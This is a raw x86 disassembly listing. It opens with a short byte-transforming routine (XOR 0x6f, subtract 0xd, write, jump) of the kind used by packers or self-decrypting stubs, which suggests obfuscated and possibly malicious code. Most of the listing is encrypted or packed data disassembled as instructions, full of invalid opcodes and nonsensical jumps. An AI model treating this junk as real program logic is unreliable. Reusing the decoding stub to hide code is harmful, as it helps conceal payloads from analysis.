  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
  403892:	mov    ds:0xa508636b,eax
  403897:	fcom   QWORD PTR fs:[edx]
  40389a:	data16 cmc 
  40389c:	dec    esi
  40389d:	fstp   QWORD PTR [edi+0x62]
  4038a0:	(bad)  
  4038a1:	fstp   QWORD PTR [edi+0x62]
  4038a4:	bound  ebx,QWORD PTR ds:0x8564932
  4038aa:	or     al,0xe3
  4038ac:	dec    edi
  4038ad:	inc    ebx
  4038ae:	into   
  4038af:	fstp   TBYTE PTR [esi]
  4038b1:	nop
  4038b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038b4:	xchg   ebp,edx
  4038b6:	xlat   BYTE PTR ds:[ebx]
  4038b7:	add    bh,al
  4038b9:	das    
  4038ba:	pop    es
  4038bb:	jmp    0x93ec:0xf053d80e
  4038c2:	fidivr WORD PTR [eax+0x5334f860]
  4038c8:	test   al,0xa4
  4038ca:	jnp    0x4038ea
  4038cc:	mov    bl,0x18
  4038ce:	fild   WORD PTR [esi]
  4038d0:	imul   ebp,DWORD PTR [edx-0x6661075d],0xffffffa1
  4038d7:	xor    bl,ah
  4038d9:	push   0xffffffb3
  4038db:	or     ch,BYTE PTR [edi-0x6a597bd8]
  4038e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038e2:	sub    eax,0x990a8c89
  4038e7:	imul   ecx,DWORD PTR [eax],0xaf608f9c
  4038ed:	imul   ebp,DWORD PTR [esi*4+0x5459a170],0xfffffff0
  4038f5:	cmc    
  4038f6:	pop    edx
  4038f7:	rcr    BYTE PTR cs:0x954dc926,0x92
  4038ff:	sbb    dl,bh
  403901:	inc    DWORD PTR es:[ecx]
  403904:	lods   eax,DWORD PTR ds:[esi]
  403905:	jmp    0x40cd79db
  40390a:	or     al,0xe0
  40390c:	jmp    0x569afb00
  403911:	pop    edi
  403912:	jecxz  0x403901
  403914:	mov    ch,0x43
  403916:	ret    0x291f
  403919:	icebp  
  40391a:	mov    al,ds:0x760ffcef
  40391f:	js     0x4038f7
  403921:	or     al,0x7b
  403923:	(bad)  
  403924:	into   
  403925:	into   
  403926:	add    eax,0xcb1c8e1e
  40392b:	out    dx,eax
  40392c:	ja     0x4038b8
  40392e:	and    ebp,0xba9dad2e
  403934:	inc    eax
  403935:	(bad)
  403938:	and    bl,bh
  40393a:	lods   eax,DWORD PTR ds:[esi]
  40393b:	mov    eax,0x252c6c0f
  403940:	fsubr  st(0),st
  403942:	(bad)  
  403944:	mov    esp,0x24079c17
  403949:	adc    edx,eax
  40394b:	pop    eax
  40394c:	js     0x4038d4
  40394e:	pop    ds
  40394f:	add    al,0x4a
  403951:	das    
  403952:	pop    esp
  403953:	pop    edx
  403954:	xchg   edx,eax
  403955:	dec    edx
  403956:	aas    
  403957:	cdq    
  403958:	popa   
  403959:	mov    ecx,0xaf41fe74
  40395e:	retf   0x14c4
  403961:	dec    esi
  403962:	leave  
  403963:	(bad)
  403966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403967:	jp     0x403948
  403969:	nop
  40396a:	adc    ebp,DWORD PTR [edi]
  40396c:	lds    esi,FWORD PTR [esi+0x176b267]
  403972:	push   esi
  403973:	loopne 0x40390d
  403975:	je     0x40397b
  403977:	cmp    BYTE PTR [eax],0x13
  40397a:	inc    edi
  40397b:	mov    bl,0x4e
  40397d:	add    BYTE PTR [ebp-0x7e],bl
  403980:	ins    BYTE PTR es:[edi],dx
  403981:	or     al,0xf3
  403983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403984:	sub    BYTE PTR [edi+0x3489dad],dh
  40398a:	fwait
  40398b:	cmp    ah,0x94
  40398e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40398f:	dec    esi
  403990:	xchg   edi,eax
  403991:	push   0xf439f9a0
  403996:	inc    esp
  403997:	mov    bl,0x34
  403999:	pop    esp
  40399a:	cmp    eax,0xbb2aec41
  40399f:	cli    
  4039a0:	dec    ebx
  4039a1:	inc    ebx
  4039a2:	xlat   BYTE PTR ds:[ebx]
  4039a3:	cli    
  4039a4:	mov    bl,0x53
  4039a6:	daa    
  4039a7:	xchg   ebp,eax
  4039a8:	push   0xea28e266
  4039ad:	dec    esp
  4039ae:	adc    ch,ah
  4039b0:	mov    esp,0x68d69c61
  4039b5:	iret   
  4039b6:	pop    ds
  4039b7:	mov    al,0x21
  4039b9:	xor    edx,0xe5d85903
  4039bf:	mov    eax,0xc5ee84c8
  4039c4:	jbe    0x40399a
  4039c6:	sbb    BYTE PTR ds:0xd47d90fd,dh
  4039cc:	adc    DWORD PTR [eax-0x7a],eax
  4039cf:	adc    al,0xe4
  4039d1:	dec    esi
  4039d2:	sub    al,0xde
  4039d4:	fidiv  WORD PTR [edx-0x53904710]
  4039da:	imul   esi,DWORD PTR [esi],0x7b
  4039dd:	rcr    DWORD PTR [ecx],cl
  4039df:	pop    ebx
  4039e0:	shl    bl,0xc3
  4039e3:	ins    BYTE PTR es:[edi],dx
  4039e4:	jge    0x40397b
  4039e6:	inc    ecx
  4039e7:	inc    esi
  4039e8:	mov    edx,gs
  4039ea:	mov    edx,0x2f75b808
  4039ef:	or     al,0x7f
  4039f1:	ficom  DWORD PTR [esi+ebx*4+0x40210b0b]
  4039f8:	mov    al,ds:0xa89bfe78
  4039fd:	fild   QWORD PTR [eax]
  4039ff:	dec    ecx
  403a00:	cmp    eax,0x8ae808ca
  403a05:	push   0x62470afe
  403a0a:	mov    dh,0x1b
  403a0c:	sub    BYTE PTR [ebp-0x5f8c90ba],ch
  403a12:	ret    
  403a13:	dec    edx
  403a14:	les    ecx,FWORD PTR [ecx+0x25446670]
  403a1a:	in     eax,0x18
  403a1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a1d:	mov    ebx,0xbe29aece
  403a22:	mov    ebx,0x6d9809f8
  403a27:	test   BYTE PTR [edi],bh
  403a29:	ret    
  403a2a:	ins    DWORD PTR es:[edi],dx
  403a2b:	and    BYTE PTR ds:0xb967ea88,dh
  403a31:	jno    0x403a75
  403a33:	and    al,bh
  403a35:	push   ebx
  403a36:	mov    bl,0x5c
  403a38:	lods   eax,DWORD PTR ds:[esi]
  403a39:	in     eax,0xa8
  403a3b:	shl    bl,cl
  403a3d:	jno    0x4039fe
  403a3f:	stc    
  403a40:	push   ds
  403a41:	pop    ecx
  403a42:	test   ebp,ecx
  403a44:	mov    al,bl
  403a46:	xchg   BYTE PTR [ebx-0x8],cl
  403a49:	repz inc ebx
  403a4b:	test   BYTE PTR [ecx-0x12],0xc6
  403a4f:	inc    ecx
  403a50:	cmp    cl,dl
  403a52:	stos   BYTE PTR es:[edi],al
  403a53:	mov    dl,0xce
  403a55:	lock add BYTE PTR [ebx+0x7],dl
  403a59:	lods   al,BYTE PTR ds:[esi]
  403a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a5b:	cmp    BYTE PTR [edx],dl
  403a5d:	dec    esi
  403a5e:	add    eax,0x850a71a4
  403a63:	mov    ch,0x66
  403a65:	mov    ax,0x43f7
  403a69:	mov    ebx,0xb0cb69b6
  403a6e:	fldcw  WORD PTR [ebx+eiz*1+0x5f92c56d]
  403a75:	aas    
  403a76:	push   cs
  403a77:	mov    esp,esi
  403a79:	pop    edx
  403a7a:	mov    al,0xf8
  403a7c:	lea    edi,[ebp+0x228a613a]
  403a82:	daa    
  403a83:	fsub   DWORD PTR [ebp+0x167461f0]
  403a89:	inc    esp
  403a8a:	sbb    dl,dh
  403a8c:	xchg   edi,eax
  403a8d:	sbb    ecx,eax
  403a8f:	xchg   esi,eax
  403a90:	aas    
  403a91:	div    dh
  403a93:	rcl    ebp,cl
  403a95:	daa    
  403a96:	mov    edi,0xaaee9bc4
  403a9b:	scas   al,BYTE PTR es:[edi]
  403a9c:	and    BYTE PTR [ebx+0x1],ah
  403a9f:	dec    edx
  403aa0:	pop    esi
  403aa1:	dec    eax
  403aa2:	push   0x31ab8530
  403aa7:	lods   al,BYTE PTR ds:[esi]
  403aa8:	test   cl,0xab
  403aab:	sbb    bl,ah
  403aad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aae:	add    ebp,DWORD PTR [edx-0x6c841ae6]
  403ab4:	mov    bh,0x64
  403ab6:	shr    ecx,cl
  403ab8:	jno    0x403ac0
  403aba:	fdivrp st(4),st
  403abc:	jae    0x403a5d
  403abe:	adc    al,0x14
  403ac0:	out    0xc9,al
  403ac2:	jl     0x403ae1
  403ac4:	fdiv   DWORD PTR [edx+0x5a]
  403ac7:	xchg   ebx,eax
  403ac8:	in     al,dx
  403ac9:	sub    al,BYTE PTR [ebx+edi*8+0x623589ed]
  403ad0:	mov    al,ds:0x46d0f1f
  403ad5:	loopne 0x403b4a
  403ad7:	xor    bh,ch
  403ad9:	push   cs
  403ada:	int3   
  403adb:	ins    BYTE PTR es:[edi],dx
  403adc:	cs int 0x39
  403adf:	repz rcl BYTE PTR [eax-0x44cb37d5],1
  403ae6:	adc    al,dl
  403ae8:	cmp    DWORD PTR [ebp+0x1b],ebx
  403aeb:	iret   
  403aec:	ins    DWORD PTR es:[edi],dx
  403aed:	cmp    ecx,DWORD PTR [edi-0x664f40eb]
  403af3:	fs loopne 0x403acc
  403af6:	xchg   ebp,eax
  403af7:	ror    ebx,1
  403af9:	push   es
  403afa:	cmp    DWORD PTR [edx+0x138469cf],edx
  403b00:	xchg   ecx,eax
  403b01:	imul   DWORD PTR [edi+0x1c]
  403b04:	cmp    al,0x80
  403b06:	fnstcw WORD PTR [ebp+0x54ebd8f8]
  403b0c:	scas   eax,DWORD PTR es:[edi]
  403b0d:	sub    eax,0x50992853
  403b12:	mov    al,0x87
  403b14:	into   
  403b15:	xor    al,0x96
  403b17:	mov    cl,BYTE PTR [eax+0x64d9a841]
  403b1d:	fcom   QWORD PTR [esi+ebx*1+0x57f7558a]
  403b24:	jmp    0x403b5a
  403b26:	sbb    ch,bh
  403b28:	pushf  
  403b29:	mov    ?,esp
  403b2b:	es nop
  403b2d:	mov    esp,0x5ab7655c
  403b32:	push   edx
  403b33:	mov    cl,0x3a
  403b35:	fistp  QWORD PTR [esi+0x38]
  403b38:	jle    0x403aec
  403b3a:	inc    edx
  403b3b:	(bad)  
  403b3c:	(bad)
  403b40:	push   esp
  403b41:	and    DWORD PTR [esi],0xfffffff7
  403b44:	scas   al,BYTE PTR es:[edi]
  403b45:	inc    edi
  403b46:	push   edx
  403b47:	cld    
  403b48:	pop    edx
  403b49:	jg     0x403acf
  403b4b:	imul   edi,DWORD PTR [edi],0x3c65d5df
  403b51:	cmp    al,0x43
  403b53:	(bad)  
  403b54:	in     al,0x5a
  403b56:	dec    eax
  403b57:	inc    esp
  403b58:	fwait
  403b59:	test   eax,0x60dc270b
  403b5e:	call   0x7390ed81
  403b63:	into   
  403b64:	nop
  403b65:	jo     0x403af3
  403b67:	int    0xb3
  403b69:	and    dh,ch
  403b6b:	dec    edi
  403b6c:	adc    DWORD PTR [eax-0x5b],ecx
  403b6f:	inc    esp
  403b70:	sub    al,0x7
  403b72:	scas   eax,DWORD PTR es:[edi]
  403b73:	fnstcw WORD PTR [edi+0x6149a365]
  403b79:	bound  ebx,QWORD PTR [eax+0x37]
  403b7c:	jmp    0xc189805a
  403b81:	fsubr  DWORD PTR [ebp-0x41]
  403b84:	leave  
  403b85:	mov    ecx,DWORD PTR [ebx+0x49e1e8d6]
  403b8b:	jae    0x403b13
  403b8d:	sbb    ebp,DWORD PTR [ecx-0x58ddace4]
  403b93:	das    
  403b94:	or     eax,0x7ca483b
  403b99:	out    dx,al
  403b9a:	icebp  
  403b9b:	adc    eax,DWORD PTR [esi+0x2d]
  403b9e:	jae    0x403bed
  403ba0:	jmp    0x8983:0x887e036b
  403ba7:	(bad)  
  403ba8:	sar    DWORD PTR [ecx+0x63],cl
  403bab:	mov    ds:0x526ffe3c,eax
  403bb0:	and    DWORD PTR [edx-0xb594b5b],edi
  403bb6:	or     eax,0xb6ea6f46
  403bbb:	xchg   esi,eax
  403bbc:	mov    esp,0x916b2aad
  403bc1:	stc    
  403bc2:	or     dh,dh
  403bc4:	sub    BYTE PTR [edi],cl
  403bc6:	out    0xe4,al
  403bc8:	test   eax,0x3cfe90aa
  403bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bce:	inc    esp
  403bcf:	cwde   
  403bd0:	or     BYTE PTR [ebx+0xc],bh
  403bd3:	iret   
  403bd4:	test   eax,0xa4700608
  403bd9:	stos   DWORD PTR es:[edi],eax
  403bda:	mov    gs,WORD PTR [esi+esi*8+0x7a285d8b]
  403be1:	xor    DWORD PTR [ebp+0x5a],eax
  403be4:	sub    DWORD PTR [edi-0x31],ebx
  403be7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403be8:	xor    BYTE PTR [edi+0x10],dl
  403beb:	ins    DWORD PTR es:[edi],dx
  403bec:	and    al,0x79
  403bee:	out    0xbd,al
  403bf0:	push   0x233ec55d
  403bf5:	sar    ebx,1
  403bf7:	scas   eax,DWORD PTR es:[edi]
  403bf8:	fcomp  QWORD PTR [edi-0x4ad9050a]
  403bfe:	add    eax,0x1eb12653
  403c03:	mov    cl,0xec
  403c05:	imul   ebx
  403c07:	ins    BYTE PTR es:[edi],dx
  403c08:	jo     0x403bc7
  403c0a:	mov    ebx,0x914275ba
  403c0f:	retf   0x294a
  403c12:	or     edx,DWORD PTR [ebx-0xc]
  403c15:	add    edx,esp
  403c17:	inc    edx
  403c18:	add    DWORD PTR [eax+0x48],esp
  403c1b:	retf   0x3f83
  403c1e:	lahf   
  403c1f:	pop    edi
  403c20:	inc    ebp
  403c21:	inc    ecx
  403c22:	ins    DWORD PTR es:[edi],dx
  403c23:	ja     0x403c17
  403c25:	jle    0x403c33
  403c27:	mov    ah,0x31
  403c29:	xchg   ebp,eax
  403c2a:	outs   dx,DWORD PTR ds:[esi]
  403c2b:	pop    ebx
  403c2c:	cmp    BYTE PTR [esi-0x1],dl
  403c2f:	ret    0xfab3
  403c32:	mov    ah,0x4d
  403c34:	call   esi
  403c36:	and    dl,dh
  403c38:	aaa    
  403c39:	adc    ebp,DWORD PTR [ebx-0x65]
  403c3c:	add    cl,BYTE PTR ds:0xcb528c43
  403c42:	xchg   ebx,eax
  403c43:	push   ebp
  403c44:	inc    esp
  403c45:	mov    ebp,0x1cd0498f
  403c4a:	mov    ds,WORD PTR [edi]
  403c4c:	jle    0x403c1e
  403c4e:	adc    al,0xd7
  403c50:	sub    eax,0x17fa93d9
  403c55:	xor    BYTE PTR [ecx],0x2c
  403c58:	xchg   esi,eax
  403c59:	stos   DWORD PTR es:[edi],eax
  403c5a:	stos   DWORD PTR es:[edi],eax
  403c5b:	enter  0xe626,0x13
  403c5f:	test   BYTE PTR ds:0x9b892ca9,ch
  403c65:	aam    0x97
  403c67:	xchg   ecx,eax
  403c68:	adc    al,0xd0
  403c6a:	mov    esi,0x79a06037
  403c6f:	mov    ah,0xb9
  403c71:	es dec edx
  403c73:	loop   0x403c6c
  403c75:	leave  
  403c76:	xchg   esi,eax
  403c77:	out    dx,al
  403c78:	fild   WORD PTR [edx+0xd]
  403c7b:	push   edx
  403c7c:	ficomp DWORD PTR ds:0x5190df11
  403c82:	shl    BYTE PTR [ebx+0x50],0x43
  403c86:	jl     0x403c78
  403c88:	push   esp
  403c89:	push   esi
  403c8a:	call   0xe8803e24
  403c8f:	push   es
  403c90:	mov    cl,0x9d
  403c92:	adc    BYTE PTR [ecx+0x42fcb7c4],ch
  403c98:	xor    eax,0x4e5de8bc
  403c9d:	stc    
  403c9e:	les    eax,FWORD PTR [ecx]
  403ca0:	inc    edx
  403ca1:	lahf   
  403ca2:	aaa    
  403ca3:	push   ebx
  403ca4:	jmp    FWORD PTR [esi]
  403ca6:	je     0x403c2d
  403ca8:	fbld   TBYTE PTR [ebp+0x35]
  403cab:	cmp    eax,0xd3c88f88
  403cb0:	xchg   ecx,eax
  403cb1:	aas    
  403cb2:	(bad)  
  403cb3:	das    
  403cb4:	mov    dl,0xe3
  403cb6:	pop    esp
  403cb7:	ss aas 
  403cb9:	jb     0x403d13
  403cbb:	cmp    al,0x2a
  403cbd:	jns    0x403cd7
  403cbf:	fisttp DWORD PTR [eax+0x2e]
  403cc2:	enter  0xcd78,0xea
  403cc6:	icebp  
  403cc7:	sbb    eax,0xa64352eb
  403ccc:	push   edx
  403ccd:	(bad)  
  403ccf:	cmp    al,0xfa
  403cd1:	stos   BYTE PTR es:[edi],al
  403cd2:	call   0x45b5:0xaa43862a
  403cd9:	adc    al,BYTE PTR [ebp-0x2f]
  403cdc:	pop    ss
  403cdd:	fsub   DWORD PTR [eax]
  403cdf:	ss pop eax
  403ce1:	or     ebp,eax
  403ce3:	fnstsw WORD PTR [ecx+0x78f765e6]
  403ce9:	cmp    eax,0x6ae006c6
  403cee:	push   ebp
  403cef:	sbb    BYTE PTR [edi-0x64],dh
  403cf2:	mov    bh,0x67
  403cf4:	adc    eax,0xd9f7d06d
  403cf9:	enter  0x14fc,0xd8
  403cfd:	out    dx,eax
  403cfe:	repnz sub eax,ebp
  403d01:	test   eax,0xc0cc23fa
  403d06:	jg     0x403d79
  403d08:	outs   dx,DWORD PTR ds:[esi]
  403d09:	push   0x7ff74bd3
  403d0e:	inc    ecx
  403d0f:	push   esp
  403d10:	jle    0x56f70212
  403d16:	pop    ecx
  403d17:	icebp  
  403d18:	out    dx,al
  403d19:	xor    dl,bl
  403d1b:	push   cs
  403d1c:	test   DWORD PTR [ebx-0x606d642b],ebp
  403d22:	lahf   
  403d23:	pop    ss
  403d24:	inc    esi
  403d25:	lea    ebx,[ebp+0x69f82784]
  403d2b:	sbb    eax,0xa996722b
  403d30:	mov    BYTE PTR [edx-0x4eff3ab6],0xb4
  403d37:	push   0xb91d3e4c
  403d3c:	dec    esi
  403d3d:	and    BYTE PTR [ebp-0x2b],0x87
  403d41:	rol    BYTE PTR [eax],1
  403d43:	and    DWORD PTR [ecx],edi
  403d45:	dec    esi
  403d46:	test   BYTE PTR [esi+ecx*8+0x3a],dl
  403d4a:	mov    eax,ds:0xd1b5be2b
  403d4f:	adc    al,0xed
  403d51:	jns    0x403d33
  403d53:	lahf   
  403d54:	or     al,0xef
  403d56:	push   edi
  403d57:	cmp    BYTE PTR [ecx+0x73],ah
  403d5a:	or     DWORD PTR [ebx],eax
  403d5c:	pop    ecx
  403d5d:	push   ebx
  403d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d5f:	jp     0x403d52
  403d61:	out    dx,eax
  403d62:	in     eax,0xb1
  403d64:	sbb    eax,0x7dfb3c95
  403d69:	add    ebp,DWORD PTR [ebp+0x12]
  403d6c:	into   
  403d6d:	in     al,dx
  403d6e:	push   ebx
  403d6f:	mov    esi,0x77e6e291
  403d74:	add    al,0x71
  403d76:	ds out dx,eax
  403d78:	mov    ebx,DWORD PTR [eax-0x71d7105d]
  403d7e:	data16 sbb bh,BYTE PTR [ebx-0x4a]
  403d82:	jmp    0x5c4f3fc9
  403d87:	shl    DWORD PTR [eax+0x74],0x56
  403d8b:	cld    
  403d8c:	jns    0x403d93
  403d8e:	jmp    0x403dcf
  403d90:	outs   dx,BYTE PTR ds:[esi]
  403d91:	push   edx
  403d92:	inc    ebx
  403d93:	pop    ds
  403d94:	pop    eax
  403d95:	cld    
  403d96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d97:	sub    bh,BYTE PTR [esi+0x609b2a66]
  403d9d:	stc    
  403d9e:	xchg   ecx,eax
  403d9f:	mov    DWORD PTR [ebx+0x5d],edx
  403da2:	mov    ds:0x16cbba37,al
  403da7:	xchg   ecx,eax
  403da8:	push   es
  403da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403daa:	js     0x403e14
  403dac:	ss test eax,eax
  403daf:	aad    0x64
  403db1:	in     eax,0x3e
  403db3:	or     ah,BYTE PTR [esp+edi*1+0x57]
  403db7:	dec    edi
  403db8:	mov    edx,0x7a0b9ef2
  403dbd:	push   edi
  403dbe:	sub    eax,0xfa00ffe1
  403dc3:	rcr    ebp,0x28
  403dc6:	pop    edi
  403dc7:	inc    ebp
  403dc8:	fsubrp st(0),st
  403dca:	outs   dx,DWORD PTR ds:[esi]
  403dcb:	inc    esp
  403dcc:	clc    
  403dcd:	fwait
  403dce:	mov    DWORD PTR [ecx],esp
  403dd0:	icebp  
  403dd1:	xor    BYTE PTR [esi-0x49],0xb
  403dd5:	jl     0x403de0
  403dd7:	xchg   ebp,eax
  403dd8:	fld    TBYTE PTR [ebx-0x74]
  403ddb:	or     BYTE PTR [eax-0xd],0x8d
  403ddf:	not    BYTE PTR ds:0x3b79a47e
  403de5:	inc    esi
  403de6:	inc    esi
  403de7:	out    0xe,eax
  403de9:	sbb    DWORD PTR [edi+edi*1],edi
  403dec:	arpl   sp,bp
  403dee:	push   cs
  403def:	bound  ebx,QWORD PTR [ebp+0x6ce7716a]
  403df5:	xchg   ecx,eax
  403df6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403df7:	ja     0x403db6
  403df9:	rcr    BYTE PTR [ebx],1
  403dfb:	sti    
  403dfc:	or     DWORD PTR [ebp-0xf],ecx
  403dff:	test   DWORD PTR [ebx+ebx*8-0x60],eax
  403e03:	pop    esp
  403e04:	jp     0x403ddd
  403e06:	sub    eax,0xf220c819
  403e0b:	popf   
  403e0c:	test   al,0xe1
  403e0e:	sbb    eax,0x17e3db31
  403e13:	sub    eax,0xb65e60ff
  403e18:	sbb    DWORD PTR [eax],edx
  403e1a:	pop    ds
  403e1b:	stos   BYTE PTR es:[edi],al
  403e1c:	sub    dl,BYTE PTR [ebx-0x1f]
  403e1f:	icebp  
  403e20:	add    bl,bl
  403e22:	cmc    
  403e23:	xchg   BYTE PTR [edi-0x7ff835c5],cl
  403e29:	cmp    BYTE PTR [ebx+0x5237f67d],ch
  403e2f:	xor    esi,eax
  403e31:	inc    edi
  403e32:	xchg   esi,eax
  403e33:	mov    ebx,0x643e5342
  403e38:	mov    ebx,0xa962f998
  403e3d:	pop    esi
  403e3e:	rol    DWORD PTR [ebx-0x366b64b3],cl
  403e44:	cmp    esp,edi
  403e46:	push   ebx
  403e47:	fidiv  WORD PTR [eax]
  403e49:	ins    DWORD PTR es:[edi],dx
  403e4a:	js     0x403e25
  403e4c:	cmp    eax,0x570673bb
  403e51:	pop    esp
  403e52:	jle    0x403e4d
  403e54:	push   cs
  403e55:	sbb    al,0x3a
  403e57:	out    dx,al
  403e58:	push   ds
  403e59:	imul   ebx,DWORD PTR [esi-0x5776c383],0x89b58eec
  403e63:	iret   
  403e64:	mov    ds:0x1628e3d,eax
  403e69:	repnz scas eax,DWORD PTR es:[edi]
  403e6b:	fs jb  0x403df0
  403e6e:	scas   eax,DWORD PTR es:[edi]
  403e6f:	or     eax,0x82db27c1
  403e74:	sub    bl,BYTE PTR [ecx-0x2c25b9e6]
  403e7a:	retf   0x8d
  403e7d:	ja     0x403e01
  403e7f:	push   ss
  403e80:	gs cli 
  403e82:	cmp    al,0x69
  403e84:	xchg   DWORD PTR [edi-0x73429bc5],eax
  403e8a:	jne    0x403e6a
  403e8c:	xor    dh,BYTE PTR [edx-0x66e33159]
  403e92:	sar    BYTE PTR [ebp+0x9],0x41
  403e96:	inc    esi
  403e97:	and    al,0xf5
  403e99:	into   
  403e9a:	inc    edi
  403e9b:	popf   
  403e9c:	jmp    0xe69100bb
  403ea1:	xchg   ecx,eax
  403ea2:	shl    edx,0x48
  403ea5:	cmp    eax,0x8a76d126
  403eaa:	mov    ch,0x26
  403eac:	mov    bh,0x2e
  403eae:	push   ds
  403eaf:	outs   dx,BYTE PTR ds:[esi]
  403eb0:	out    0x1e,eax
  403eb2:	cli    
  403eb3:	jl     0x403ed6
  403eb5:	mul    DWORD PTR [ebp+eax*2+0x1a]
  403eb9:	cwde   
  403eba:	cli    
  403ebb:	jl     0x403e4c
  403ebd:	xor    BYTE PTR [ebx-0x2c],bl
  403ec0:	sub    al,0xcd
  403ec2:	add    DWORD PTR [esi+0x76],ebp
  403ec5:	push   0xffffff94
  403ec7:	daa    
  403ec8:	stos   BYTE PTR es:[edi],al
  403ec9:	or     eax,0x35fccc9d
  403ece:	sub    eax,0x3c01adea
  403ed3:	arpl   WORD PTR [esi-0x448b246a],ax
  403ed9:	lock bound ecx,QWORD PTR [edx-0x5e05417d]
  403ee0:	inc    edi
  403ee1:	pop    esp
  403ee2:	xchg   esi,eax
  403ee3:	push   ebp
  403ee4:	sar    DWORD PTR [edi-0x47],0xc7
  403ee8:	pop    esp
  403ee9:	push   ebx
  403eea:	mov    al,ds:0x60cc47d0
  403eef:	cld    
  403ef0:	inc    edx
  403ef1:	cmp    dh,BYTE PTR [esi]
  403ef3:	stos   BYTE PTR es:[edi],al
  403ef4:	inc    edi
  403ef5:	rcl    BYTE PTR [eax-0x738923a7],1
  403efb:	repnz xchg esi,eax
  403efd:	jle    0x403f1c
  403eff:	shr    BYTE PTR [edx-0x130a2da3],0x9f
  403f06:	and    cl,BYTE PTR [ecx-0x23]
  403f09:	and    eax,0x6f74d26b
  403f0e:	sub    eax,0x3a1857c9
  403f13:	fidivr WORD PTR [esi]
  403f15:	mov    dl,BYTE PTR [edx-0x38]
  403f18:	ss jno 0x403f00
  403f1b:	adc    al,0xd1
  403f1d:	scas   eax,DWORD PTR es:[edi]
  403f1e:	pop    es
  403f1f:	les    ebp,FWORD PTR [ecx]
  403f21:	sahf   
  403f22:	push   ebx
  403f23:	retf   
  403f24:	out    0x61,al
  403f26:	ror    BYTE PTR [edx],1
  403f28:	pop    ss
  403f29:	cmp    DWORD PTR [edx+0x39],esp
  403f2c:	sti    
  403f2d:	xchg   DWORD PTR [ebx+0x79],edx
  403f30:	bound  edx,QWORD PTR [edx]
  403f32:	or     esi,DWORD PTR [edx-0x77]
  403f35:	inc    esi
  403f36:	or     DWORD PTR [eax-0x1f4148fd],esp
  403f3c:	addr16 jo 0x403f6d
  403f3f:	inc    esi
  403f40:	test   DWORD PTR [edi+0x77f8126e],ebx
  403f46:	sbb    BYTE PTR [esi-0x7a649b40],bh
  403f4c:	test   eax,0x300d6b83
  403f51:	sahf   
  403f52:	js     0x403f4b
  403f54:	push   esi
  403f55:	xchg   bh,cl
  403f57:	cdq    
  403f58:	int3   
  403f59:	mov    al,ch
  403f5b:	lods   al,BYTE PTR ds:[esi]
  403f5c:	adc    DWORD PTR [edx],ebx
  403f5e:	lods   al,BYTE PTR ds:[esi]
  403f5f:	ror    DWORD PTR [esi+0x16330fad],1
  403f65:	adc    cl,al
  403f67:	push   eax
  403f68:	sahf   
  403f69:	outs   dx,BYTE PTR ds:[esi]
  403f6a:	mov    esi,0x1865bdcb
  403f6f:	cli    
  403f70:	sbb    al,dh
  403f72:	push   ebx
  403f73:	and    eax,0x9ce0f675
  403f78:	outs   dx,BYTE PTR ds:[esi]
  403f79:	jbe    0x403f00
  403f7b:	jg     0x403f39
  403f7d:	fsubr  st,st(3)
  403f7f:	mov    al,ds:0xec2a5a31
  403f84:	dec    ebx
  403f85:	outs   dx,BYTE PTR ds:[esi]
  403f86:	mov    bl,0x8e
  403f88:	in     eax,dx
  403f89:	ins    DWORD PTR es:[edi],dx
  403f8a:	dec    edx
  403f8b:	cmp    ebx,ebx
  403f8d:	ja     0x404008
  403f8f:	add    eax,ebp
  403f91:	push   edi
  403f92:	pop    es
  403f93:	call   esi
  403f95:	loop   0x403f4c
  403f97:	adc    eax,DWORD PTR [edi]
  403f99:	add    bl,BYTE PTR [eax]
  403f9b:	hlt    
  403f9c:	or     bh,BYTE PTR [esi]
  403f9e:	outs   dx,BYTE PTR ds:[esi]
  403f9f:	push   edx
  403fa0:	sbb    ebp,DWORD PTR [ecx+ecx*4-0x31]
  403fa4:	mov    bh,0x73
  403fa6:	jno    0x403f2f
  403fa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fa9:	mov    ch,0xd7
  403fab:	jno    0x403f92
  403fad:	xchg   ebx,eax
  403fae:	push   0xffffffac
  403fb0:	enter  0xa981,0x3c
  403fb4:	sub    BYTE PTR [esp+ebp*2],ah
  403fb7:	mov    ah,0x9c
  403fb9:	xchg   esi,eax
  403fba:	adc    al,0x87
  403fbc:	inc    edi
  403fbd:	push   ecx
  403fbe:	add    BYTE PTR [ebx],cl
